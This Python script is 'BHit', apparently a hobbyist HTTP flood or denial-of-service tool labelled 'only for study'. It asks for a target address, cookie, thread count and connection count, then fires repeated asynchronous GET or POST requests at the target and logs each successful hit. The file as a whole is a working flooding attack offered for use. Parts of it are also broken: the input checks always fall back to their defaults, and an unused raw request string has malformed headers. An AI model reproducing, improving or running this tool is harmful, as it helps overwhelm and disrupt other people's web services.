#   -*- coding:utf-8 -*-


###################################################
#                  BHit 1.01a1                    #
#     Built By Bao-Zheng.All rights reserved.     #
#                ONLY FOR STUDY                   #
###################################################

import os
import multiprocessing
import sys
from socket import *
from rich.console import Console
from rich.panel import Panel
import datetime
import aiohttp
import asyncio

console = Console()

console.print(Panel("""BHit 0.01a1\nONLY FOR STUDY"""))

type = input("Type?(GET,POST,default=POST)->")
type = type if type=="GET" or type=="POST" else "POST"
print("\033[1A\033[K",end="")
ackaddr = input("Attack Address?(default=http://127.0.0.1:80)->")
ackaddr = ackaddr if ackaddr else "http://127.0.0.1:80"
print("\033[1A\033[K",end="")
page = input("Page?(default=/)->")
page = page if page.startswith("/") else "/"
print("\033[1A\033[K",end="")
cookie = input("Cookie?(default=none)->")
print("\033[1A\033[K",end="")
threads = input("Threads?(default=8)->")
threads = int(threads) if isinstance(threads,int) and threads >0 else 8
print("\033[1A\033[K",end="")
whilem = input("Every threads max Connection?(default=100)->")
whilem = int(whilem) if isinstance(whilem,int) and threads >0 else 100
print("\033[1A\033[K",end="")
print("Information Collect Done.")

buf = (
    "%s %s HTTP/1.1\r\n"
    "HOST %s\r\n"
    "Content-Lenth: 10000000\r\n"
    "Cookie: %s\r\n"
    "\r\n"%(type,page,ackaddr,cookie)
)

async def ack(host,type,whilem,t):
    for i in range(1,whilem):
        async with aiohttp.ClientSession() as session:
            if type == "GET":
                async with session.get(host) as resp:
                    if resp.status == 200:
                        console.print("THREAD {} HIT {} OK".format(str(t),host))
            elif type == "POST":
                async with session.post(host) as resp:
                    if resp.status == 200:
                        console.print("THREAD {} HIT {} OK".format(str(t),host))

tasks = []
for i in range(1,threads):
    t = ack(ackaddr,type,whilem,i)
    task = asyncio.ensure_future(t)
    tasks.append(task)
loop = asyncio.get_event_loop()
a = datetime.datetime.strptime(str(datetime.datetime.now()),"%Y-%m-%d %H:%M:%S.%f")
loop.run_until_complete(asyncio.gather(*tasks))
b = datetime.datetime.strptime(str(datetime.datetime.now()),"%Y-%m-%d %H:%M:%S.%f")
print("Time Used:",str((b-a)))